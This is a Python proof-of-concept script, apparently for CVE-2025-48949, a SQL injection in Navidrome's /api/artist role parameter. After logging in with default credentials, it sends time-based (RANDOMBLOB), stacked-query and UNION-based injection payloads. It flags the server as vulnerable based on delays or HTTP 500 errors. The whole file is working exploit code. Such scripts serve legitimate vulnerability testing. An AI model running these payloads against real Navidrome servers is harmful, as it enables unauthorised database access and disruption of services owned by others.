#!/usr/bin/env python3
import requests
import sys
import time

TARGET = "http://127.0.0.1:4533"
USERNAME = "admin"
PASSWORD = "admin123"

def login():
    session = requests.Session()
    resp = session.post(f"{TARGET}/auth/login", json={
        "username": USERNAME,
        "password": PASSWORD
    })
    if resp.status_code != 200:
        print(f"[-] Login failed: {resp.status_code}")
        return None, None
    data = resp.json()
    token = data.get("token")
    print(f"[+] Login successful")
    return session, token

def test_sqli(session, token):
    print("[*] Testing SQL injection on /api/artist endpoint...")
    
    headers = {"x-nd-authorization": f"Bearer {token}"}
    
    payloads = [
        {
            "name": "Time-based SQLi (RANDOMBLOB)",
            "role": "albumartist');SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--",
            "check": "time",
            "threshold": 2.0
        },
        {
            "name": "Error-based SQLi (stacked query)",
            "role": "albumartist');SELECT 1;--",
            "check": "error",
            "threshold": None
        },
        {
            "name": "Union-based SQLi attempt",
            "role": "albumartist' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",
            "check": "error",
            "threshold": None
        }
    ]
    
    results = []
    
    for payload in payloads:
        print(f"\n[*] Testing: {payload['name']}")
        print(f"[*] Payload: role={payload['role'][:70]}...")
        
        start_time = time.time()
        try:
            resp = session.get(f"{TARGET}/api/artist", params={
                "_start": "0",
                "_end": "15",
                "_order": "ASC",
                "_sort": "name",
                "role": payload["role"]
            }, headers=headers, timeout=60)
            elapsed = time.time() - start_time
            
            result = {
                "name": payload["name"],
                "status_code": resp.status_code,
                "elapsed": elapsed,
                "success": False
            }
            
            if payload["check"] == "time" and elapsed > payload["threshold"]:
                print(f"[+] VULNERABLE! Time-based SQLi confirmed (delay: {elapsed:.2f}s)")
                result["success"] = True
            elif payload["check"] == "error" and resp.status_code == 500:
                print(f"[+] VULNERABLE! Error-based SQLi confirmed (HTTP 500)")
                result["success"] = True
            else:
                print(f"[-] Status: {resp.status_code}, Time: {elapsed:.2f}s")
                    
            results.append(result)
            
        except requests.exceptions.Timeout:
            print(f"[+] VULNERABLE! Request timed out (time-based SQLi confirmed)")
            results.append({"name": payload["name"], "success": True, "timeout": True})
        except Exception as e:
            print(f"[-] Error: {e}")
            results.append({"name": payload["name"], "success": False, "error": str(e)})
    
    return results

def main():
    print("=" * 60)
    print("CVE-2025-48949 - Navidrome SQL Injection PoC")
    print("Affected: Navidrome 0.55.0 - 0.55.2")
    print("Endpoint: /api/artist (role parameter)")
    print("=" * 60)
    
    session, token = login()
    if not session or not token:
        print("[-] Cannot proceed without authentication")
        sys.exit(1)
    
    results = test_sqli(session, token)
    
    print("\n" + "=" * 60)
    print("RESULTS SUMMARY")
    print("=" * 60)
    
    vulnerable = any(r.get("success", False) for r in results)
    
    for r in results:
        status = "VULNERABLE" if r.get("success") else "NOT CONFIRMED"
        print(f"  {r['name']}: {status}")
    
    if vulnerable:
        print("\n[+] Target is VULNERABLE to CVE-2025-48949")
        return 0
    else:
        print("\n[-] Could not confirm vulnerability")
        return 1

if __name__ == "__main__":
    sys.exit(main())
